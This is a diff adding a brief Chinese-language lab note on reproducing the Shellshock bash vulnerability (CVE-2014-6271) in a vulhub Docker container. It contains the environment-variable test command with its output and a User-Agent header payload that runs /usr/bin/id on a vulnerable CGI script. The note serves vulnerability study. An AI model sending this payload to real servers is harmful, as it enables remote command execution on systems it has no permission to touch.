@@ -1,0 +1,23 @@
+shellshock(CVE-2014-6271)
+漏洞复现
+==========================================================
+环境搭建：vulhub
+https://vulhub.org/
+git clone https://github.com/vulhub/vulhub.git
+cd vulhub/bash/shellshock
+docker-compose build
+docker-compose up -d 
+==========================================================
+该容器有两个bash 其中 bash-4.3.0是有漏洞的
+漏洞测试
+bash-4.3# echo $PATH 
+/usr/local/bash-4.3.0/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+bash-4.3# env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+vulnerable
+this is a test
+bash-4.3# 
+
+web服务器有safe.cgi victim.cgi
+victim.cgi为由漏洞的cgi
+User-Agent: () { :; }; echo Content-Type: text/plain; echo; /usr/bin/id
+
